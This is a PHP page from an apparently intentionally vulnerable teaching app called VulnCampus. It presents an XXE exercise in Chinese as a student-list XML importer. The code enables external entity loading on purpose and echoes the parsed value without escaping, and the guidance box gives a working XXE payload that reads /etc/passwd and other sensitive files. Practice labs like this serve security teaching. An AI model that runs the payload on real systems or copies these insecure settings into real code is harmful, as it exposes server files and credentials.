<?php
require_once __DIR__ . '/../src/helpers.php';
check_login();

$error = '';
$result = null;
$xml_input = '';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $xml_input = $_POST['xml_data'] ?? '';
    
    if (empty($xml_input)) {
        $error = 'XML 資料不能為空！';
    } else {
        try {
            // 漏洞點：XXE (XML External Entity)
            // 1. PHP 8.0+ 預設不解析外部實體，但如果開發者顯式設定了 LIBXML_NOENT (將實體替換為文字) 
            //    和 LIBXML_DTDLOAD (加載外部 DTD)，則仍然會觸發 XXE 漏洞。
            // 2. 此處未使用 libxml_disable_entity_loader(true) 或是直接禁用了安全配置。
            $dom = new DOMDocument();
            
            // 漏洞點：使用 LIBXML_NOENT | LIBXML_DTDLOAD 開啟實體解析
            if ($dom->loadXML($xml_input, LIBXML_NOENT | LIBXML_DTDLOAD)) {
                $student = simplexml_import_dom($dom);
                $result = [
                    'name' => (string)$student->name,
                    'email' => (string)$student->email,
                    'phone' => (string)$student->phone,
                ];
            } else {
                $error = 'XML 解析失敗！';
            }
        } catch (Exception $e) {
            $error = '解析過程中出錯：' . $e->getMessage();
        }
    }
}
?>
<!DOCTYPE html>
<html lang="zh-TW">
<head>
    <meta charset="UTF-8">
    <title>📁 XXE XML 外部實體注入演練 - VulnCampus</title>
    <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">
    <style>
        body { background-color: #f8f9fa; }
        .card { margin-top: 30px; }
    </style>
</head>
<body>

<div class="container my-5">
    <div class="d-flex justify-content-between align-items-center mb-4 border-bottom pb-2">
        <h2>📁 XXE 外部實體注入 (XML External Entity Injection) 專屬演練</h2>
        <div>
            <span class="mr-3">您好，<strong><?= $_SESSION['user']['name'] ?></strong></span>
            <a href="/index.php" class="btn btn-secondary">回首頁</a>
        </div>
    </div>

    <div class="row">
        <!-- 輸入區 -->
        <div class="col-md-6">
            <div class="card shadow-sm">
                <div class="card-header bg-danger text-white font-weight-bold">
                    📝 學生名單 XML 匯入系統
                </div>
                <div class="card-body">
                    <p class="text-muted">
                        本系統接收 XML 格式的學生資料進行名單解析。
                    </p>
                    <form method="POST" action="">
                        <div class="form-group">
                            <label for="xml_data" class="font-weight-bold">請輸入 XML 資料：</label>
                            <textarea name="xml_data" id="xml_data" class="form-control" rows="8" required><?= htmlspecialchars($xml_input ?: '<?xml version="1.0" encoding="utf-8"?>
<student>
  <name>王小明</name>
  <email>student01@vulncampus.local</email>
  <phone>0922-111-222</phone>
</student>') ?></textarea>
                        </div>
                        <button type="submit" class="btn btn-danger btn-block">🚀 解析並匯入 XML</button>
                    </form>
                    
                    <div class="alert alert-warning mt-4">
                        💡 <strong>教學演練指引：</strong><br>
                        1. <strong>任意檔案讀取測試</strong>：輸入以下含有惡意外部實體定義的 XML 內容。我們宣告了一個實體 <code>&amp;xxe;</code> 指向伺服器上的敏感檔案（如 <code>file:///etc/passwd</code> 或 Windows 下的 <code>file:///c:/windows/win.ini</code>，或指向 <code>file:///var/www/html/src/db.php</code>），點擊解析後，觀察是否能在右側結果直接讀取到該敏感檔案內容！
                        <pre class="bg-dark text-warning p-2 mt-2 rounded"><code>&lt;?xml version="1.0" encoding="utf-8"?&gt;
&lt;!DOCTYPE student [
  &lt;!ENTITY xxe SYSTEM "file:///etc/passwd"&gt;
]&gt;
&lt;student&gt;
  &lt;name&gt;&amp;xxe;&lt;/name&gt;
  &lt;email&gt;hacker@example.com&lt;/email&gt;
  &lt;phone&gt;0900-000-000&lt;/phone&gt;
&lt;/student&gt;</code></pre>
                    </div>
                </div>
            </div>
        </div>

        <!-- 結果展示 -->
        <div class="col-md-6">
            <div class="card shadow-sm">
                <div class="card-header bg-dark text-white font-weight-bold">
                    📋 XML 解析結果
                </div>
                <div class="card-body bg-light" style="max-height: 550px; overflow-y: auto;">
                    <?php if ($error): ?>
                        <div class="alert alert-danger"><?= htmlspecialchars($error) ?></div>
                    <?php elseif ($result): ?>
                        <div class="alert alert-success">XML 解析成功！</div>
                        <table class="table table-bordered table-sm bg-white">
                            <tr><th>學生姓名 (Name)</th><td><?= htmlspecialchars($result['name']) ?></td></tr>
                            <tr><th>電子信箱 (Email)</th><td><?= htmlspecialchars($result['email']) ?></td></tr>
                            <tr><th>聯絡電話 (Phone)</th><td><?= htmlspecialchars($result['phone']) ?></td></tr>
                        </table>
                        
                        <div class="mt-3">
                            <h5>原始回顯值 (未經過濾)：</h5>
                            <div class="p-3 border rounded bg-white font-weight-bold text-danger">
                                <?= $result['name'] ?>
                            </div>
                        </div>
                    <?php else: ?>
                        <p class="text-center text-muted">目前尚未解析任何資料</p>
                    <?php endif; ?>
                </div>
            </div>
        </div>
    </div>
</div>

</body>
</html>
